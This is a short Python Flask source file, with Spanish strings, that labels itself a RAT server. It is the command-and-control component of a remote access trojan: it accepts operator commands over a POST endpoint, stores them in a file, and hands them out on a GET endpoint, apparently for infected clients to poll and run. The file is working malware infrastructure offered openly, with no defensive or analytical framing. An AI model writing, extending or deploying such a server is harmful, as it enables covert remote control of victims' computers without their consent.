from flask import Flask, request, jsonify
import os

app = Flask(__name__)

COMMAND_FILE = "commands.txt"

@app.route("/")
def home():
    return "Servidor del RAT activo."

@app.route("/comando", methods=["POST"])
def recibir_comando():
    data = request.get_json()
    if not data or "cmd" not in data:
        return jsonify({"error": "Comando no válido"}), 400

    comando = data["cmd"]
    args = data.get("args", "")

    comando_completo = f"{comando} {args}".strip()

    with open(COMMAND_FILE, "w") as f:
        f.write(comando_completo)

    return jsonify({"status": "ok", "comando": comando_completo})

@app.route("/comando", methods=["GET"])
def enviar_comando():
    if not os.path.exists(COMMAND_FILE):
        return "sin comando"

    with open(COMMAND_FILE, "r") as f:
        comando = f.read().strip()

    return comando or "sin comando"
